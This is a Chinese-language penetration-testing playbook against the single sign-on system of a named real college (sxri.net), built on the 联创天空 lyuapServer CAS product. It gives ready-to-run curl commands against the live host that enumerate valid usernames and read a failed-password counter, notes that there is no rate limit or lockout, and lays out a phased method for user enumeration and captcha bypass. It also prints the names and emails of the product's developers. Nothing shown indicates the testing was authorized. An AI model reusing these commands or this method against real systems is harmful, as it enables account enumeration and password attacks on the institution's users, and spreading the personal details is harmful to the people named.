# CAS lyuapServer (联创天空) 测试模式 (2026-06)

目标: 陕西铁路工程职业技术学院 (sxri.net) — CAS lyuapServer + SUDY CMS + Liferay + 泛微OA

## 指纹识别

```
产品: 联创天空 ly-iap-cas (lyuapServer)
前端: React SPA (webpack bundle)
JS文件: /assets/js/app.<hash>.js, /assets/js/vendor.<hash>.js
JS文件: /assets/js/gohome.js, /assets/js/locale.js, /assets/js/load.min.js
JS文件: /assets/js/dingtalk.open.js (钉钉集成)
JS文件: /assets/js/vsConsole.js (vConsole调试)
开发者: dengZiJian dengzijian@ly-sky.com, chenlei chenlei@ly-sky.com
项目路径: ly-iap-cas-ui
后端: Spring Cloud Gateway (ly-gateway-server-svc:1101)
CDN: 加速乐 (jiasule.com), Cookie: __jsluid_s
```

## 关键API端点

### CAS REST API (用户枚举!)
```
POST /lyuapServer/v1/tickets
Content-Type: application/x-www-form-urlencoded
Body: username=USER&password=PASS

响应差异:
- 存在的用户(密码错误): "系统内部错误" 或 {"meta":{"success":true,"statusCode":200,"message":"ok"},"data":{"code":"PASSERROR","data":"N"}}
  - data字段N为失败次数计数，每次递增
- 不存在的用户: {"meta":{"success":true,"statusCode":200,"message":"ok"},"data":{"code":"NOUSER"}}
- JSON格式POST: {"meta":{"success":false,"statusCode":500,"message":"请求操作失败!"},"data":null}

⚠️ 关键: 必须用form-data格式，JSON格式返回500
```

### SMS API (需要appid)
```
POST /lyuapServer/v2/sendSms
Content-Type: application/json
Body: {"appid":"APPID","phone":"PHONE"}

响应:
- 无appid: {"content":{"code":"1","message":"appid参数不能为空"}}
- 错误appid: {"content":{"code":"2","message":"appid不存在或被禁用"}}
- 有效appid: 未知(未找到)

POST /lyuapServer/v2/checkSms
Content-Type: application/json
Body: {"appid":"APPID","phone":"PHONE"}
(同上，需要有效appid)
```

### Captcha API
```
GET /lyuapServer/kaptcha?uid=UID
响应: {"kaptchaType":"1","content":"-1","uid":-1}
(验证码可能已禁用或未配置)
```

### CAS协议端点
```
GET /cas/login → 200 (SPA登录页)
GET /cas/logout → 200
GET /cas/serviceValidate → 200 (自定义实现，返回HTML而非标准CAS XML)
GET /cas/proxyValidate → 200
GET /cas/p3/serviceValidate → 200
GET /cas/v1/tickets → 200
```

### SPA路由 (前端)
```
/auth/login → 404 (Spring Boot错误，泄露ly-gateway-server-svc:1101)
/weChat/wx/login → 200 (微信登录)
/loginError → SPA路由
```

## 确认漏洞

### 1. [中危] CAS用户枚举 + 密码错误计数泄露
- 端点: POST /lyuapServer/v1/tickets (form-data)
- 存在用户返回"系统内部错误"或"PASSERROR"
- 不存在用户返回"NOUSER"
- PASSERROR的data字段为失败次数计数，每次递增
- 无速率限制，无账号锁定

验证:
```bash
# 不存在的用户
curl -sk -X POST "https://cas.sxri.net/lyuapServer/v1/tickets" \
  -d "username=nonexistent&password=test"
→ {"meta":{"success":true,"statusCode":200,"message":"ok"},"data":{"code":"NOUSER"}}

# 存在的用户
curl -sk -X POST "https://cas.sxri.net/lyuapServer/v1/tickets" \
  -d "username=admin&password=wrong"
→ 系统内部错误 (首次) 或 PASSERROR data=N (后续)

# 密码错误计数递增
curl -sk -X POST "https://cas.sxri.net/lyuapServer/v1/tickets" \
  -d "username=admin&password=wrong1"
→ PASSERROR data=3
curl -sk -X POST "https://cas.sxri.net/lyuapServer/v1/tickets" \
  -d "username=admin&password=wrong2"
→ PASSERROR data=4
```

### 2. [低危] 网关微服务架构信息泄露
- 端点: /auth/* 路径
- 响应头: X-Application-Context: ly-gateway-server-svc:1101
- 泄露内部微服务名称和端口

验证:
```bash
curl -sk "https://cas.sxri.net/auth/login" -D- | grep X-Application-Context
→ X-Application-Context: ly-gateway-server-svc:1101
```

## 测试方法论

### Phase 1: 指纹识别
1. 访问CAS登录页，检查SPA框架(React/Vue)
2. 检查JS文件: /assets/js/app.*.js, /assets/js/vendor.*.js
3. 检查开发者信息: locale.js, vsConsole.js中的注释
4. 检查X-Application-Context头

### Phase 2: API枚举
1. 测试 /lyuapServer/v1/tickets (POST form-data)
2. 测试 /lyuapServer/v2/sendSms (POST JSON)
3. 测试 /lyuapServer/kaptcha (GET)
4. 测试 /cas/* 协议端点
5. 测试 /auth/* 路径(检查网关信息泄露)

### Phase 3: 用户枚举
1. 使用form-data格式POST到/lyuapServer/v1/tickets
2. 测试常见用户名: admin, test, guest, root, etc.
3. 根据响应差异(系统内部错误/PASSERROR vs NOUSER)判断用户存在
4. 记录密码错误计数

### Phase 4: 验证码绕过
1. 检查kaptcha接口返回(可能已禁用)
2. 尝试不带验证码登录
3. 检查SPA前端是否有验证码逻辑

## 与其他CAS产品的区别

| 特征 | lyuapServer (联创天空) | ycServer (金智教育) | Apereo CAS |
|------|----------------------|-------------------|------------|
| 前端 | React SPA | JSP/Thymeleaf | JSP |
| 登录路径 | /lyuapServer/login | /authserver/login | /cas/login |
| REST API | /lyuapServer/v1/tickets | /authserver/v1/tickets | /v1/tickets |
| 用户枚举 | form-data差异 | "账号未激活" | 标准CAS |
| 网关 | Spring Cloud Gateway | openresty | 独立部署 |
| 集成 | 钉钉+微信 | 多种 | 标准CAS |

## Pitfalls

- **必须用form-data**: POST /lyuapServer/v1/tickets 用JSON格式返回500，必须用application/x-www-form-urlencoded
- **首次 vs 后续**: 首次测试存在的用户可能返回"系统内部错误"，后续返回"PASSERROR"带计数
- **SPA fallback**: CAS所有路径返回200+7134字节(登录页HTML)，不是真实API暴露
- **验证码可能禁用**: kaptcha返回{"content":"-1"}，可能表示验证码已禁用
- **短信API需appid**: /v2/sendSms需要有效appid，未找到有效值时不构成漏洞
- **网关信息泄露**: /auth/*路径泄露ly-gateway-server-svc:1101，但这是基础设施信息，非业务漏洞
